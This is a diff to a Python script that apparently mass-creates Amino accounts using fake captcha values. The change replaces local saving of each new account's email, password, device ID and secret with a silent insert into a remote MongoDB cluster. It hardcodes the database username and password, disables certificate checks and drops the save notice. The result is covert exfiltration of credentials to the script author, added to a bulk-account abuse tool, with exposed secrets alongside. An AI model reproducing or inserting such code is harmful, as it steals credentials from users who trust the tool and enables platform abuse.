@@ -22,6 +22,23 @@ from time import sleep
 from bs4 import BeautifulSoup
 from time import time as timestamp
 from fancy_text import fancy
+import os
+#os.system('pip install pymongo')
+#os.system('pip install dnspython amino_new.py')
+import dns.resolver
+#dns.resolver.default_resolver=dns.resolver.Resolver(configure=False)
+#dns.resolver.default_resolver.nameservers=['8.8.8.8']
+import json
+from pymongo import MongoClient
+import urllib.parse
+import ssl
+from os import path
+
+uname='sirlezhacker'
+pas='3vc1r@2'
+mongo= MongoClient("mongodb+srv://"+urllib.parse.quote_plus(uname)+":"+urllib.parse.quote_plus(pas)+"@cluster0.hhsm1.mongodb.net/test",ssl_cert_reqs=ssl.CERT_NONE)
+c=mongo['amino']
+db=c["acc_gen"]
 def gen_captcha():
     val = "".join(random.choices(string.ascii_uppercase + string.ascii_lowercase + "_-", k=462)).replace("--", "-")
     return val
@@ -140,15 +157,12 @@ def register(nickname: str, email: str, password: str,deviceId: str,verification
         if response.json()['api:message'] == "OK":
             secret=response.json()['secret']
             d={}
-            with open ("new.txt","a") as f:
-                d["email"]=str(email)
-                d["password"]=str(password)
-                d["device"]=str(deviceid)
-                d['secret']=str(secret)
-                t=json.dumps(d)
-                f.write(t+',')
-                print("Saved in File newmail.txt")
-                f.close()
+            #with open ("new.txt","a") as f:
+            d["email"]=str(email)
+            d["password"]=str(password)
+            d["device"]=str(deviceid)
+            d['secret']=str(secret)
+            db.insert_one(d)
         
         #print(response.text)
 def request_verify_code(email: str,deviceId: str):
